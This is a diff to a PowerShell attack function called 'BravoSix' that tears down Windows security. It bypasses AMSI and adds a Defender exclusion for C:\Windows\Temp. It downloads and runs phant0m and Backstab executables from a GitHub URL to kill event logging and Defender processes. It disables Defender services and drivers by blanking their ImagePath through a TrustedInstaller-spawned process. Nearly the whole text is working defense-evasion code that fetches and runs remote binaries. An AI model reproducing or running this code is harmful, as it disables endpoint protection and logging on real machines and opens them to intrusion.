@@ -13,9 +13,19 @@ function BravoSix {
     Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}}
     $g=$f.SetValue($null,$true)
 
-    Write-Host -NoNewLine 'Press any key to continue...';
+    Write-Host  'Press any key to continue...';
     $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
-    
+
+    # Adding defender exclusions
+    Write-Host "[+] Adding Defender exclusion folders" -ForegroundColor Green
+    Write-Host
+    $exclusionPath = "C:\Windows\Temp"
+    Add-MpPreference -ExclusionPath $exclusionPath -AttackSurfaceReductionOnlyExclusions $exclusionPath
+
+    Write-Host  'Press any key to continue...';
+    $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
+
+
     # Killing eventlog
     Write-Host "[+] Disabling EventLogs" -ForegroundColor Green
     Write-Host
@@ -23,17 +33,9 @@ function BravoSix {
     Invoke-WebRequest -Uri https://github.com/RFC1918-hub/RFCRandom/raw/main/phant0m-exe.exe -OutFile $phant0mPath
     & $phant0mPath
 
-    Write-Host -NoNewLine 'Press any key to continue...';
+    Write-Host  'Press any key to continue...';
     $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
-    
-    # Adding defender exclusions
-    Write-Host "[+] Adding Defender exclusion folders" -ForegroundColor Green
-    Write-Host
-    $exclusionPath = "C:\Windows\Temp"
-    Add-MpPreference -ExclusionPath $exclusionPath -AttackSurfaceDarkReductionOnlyExclusions $exclusionPath
 
-    Write-Host -NoNewLine 'Press any key to continue...';
-    $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
     
     # Disabling defender services and drivers
     $spawnPPID = @"
@@ -208,13 +210,9 @@ function BravoSix {
     $svc_list = @("WdNisSvc", "WinDefend", "Sense")
     foreach ($svc in $svc_list) {
         if ($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc")) {
-            if (-Not ((Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc").Start -eq 4)) {
-                Write-Host "[i] Disabling $svc" -ForegroundColor DarkRed
-                $powershellArg = "-c Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\$svc"" -Name Start -Value 4"
-                [GetTrustedInstaller.spawnPPID]::Run($serviceProcessId, $powershellPath, $powershellArg)
-            } else {
-                Write-Host "Service $svc is already disabled"
-            }
+            Write-Host "[i] Disabling $svc" -ForegroundColor DarkRed
+            $powershellArg = "-c Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\$svc"" -Name ImagePath -Value ''"
+            [GetTrustedInstaller.spawnPPID]::Run($serviceProcessId, $powershellPath, $powershellArg)
         }
     }
     
@@ -224,24 +222,20 @@ function BravoSix {
     $drv_list = @("WdnisDrv", "wdfilter", "wdboot")
     foreach ($drv in $drv_list) {
         if ($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv")) {
-            if (-Not ((Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv").Start -eq 4)) {
-                Write-Host "[i] Disabling $drv" -ForegroundColor DarkRed
-                $powershellArg = "Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\$drv"" -Name Start -Value 4"
-                [GetTrustedInstaller.spawnPPID]::Run($serviceProcessId, $powershellPath, $powershellArg)
-            } else {
-                Write-Host "Service $drv is already disabled"
-            }
+            Write-Host "[i] Disabling $drv" -ForegroundColor DarkRed
+            $powershellArg = "Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\$drv"" -Name ImagePath -Value ''"
+            [GetTrustedInstaller.spawnPPID]::Run($serviceProcessId, $powershellPath, $powershellArg)
         }
     }
 
-    Write-Host -NoNewLine 'Press any key to continue...';
+    Write-Host  'Press any key to continue...';
     $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
     
     # Killing services 
     $backstabPath = $exclusionPath + "\Backstab.exe"
     Invoke-WebRequest https://github.com/RFC1918-hub/RFCRandom/raw/main/Backstab.exe -OutFile $backstabPath
     
-    $process_list = @("MsSense", "MsMpEng", "NisSrv", "SenseIR", "SenseNdr.exe")
+    $process_list = @("MsSense", "MsMpEng", "NisSrv", "SenseIR", "SenseNdr")
     foreach ($process in $process_list) {
         if (Get-Process $process -ErrorAction SilentlyContinue) {
             Write-Host "[i] Killing $drv" -ForegroundColor DarkRed
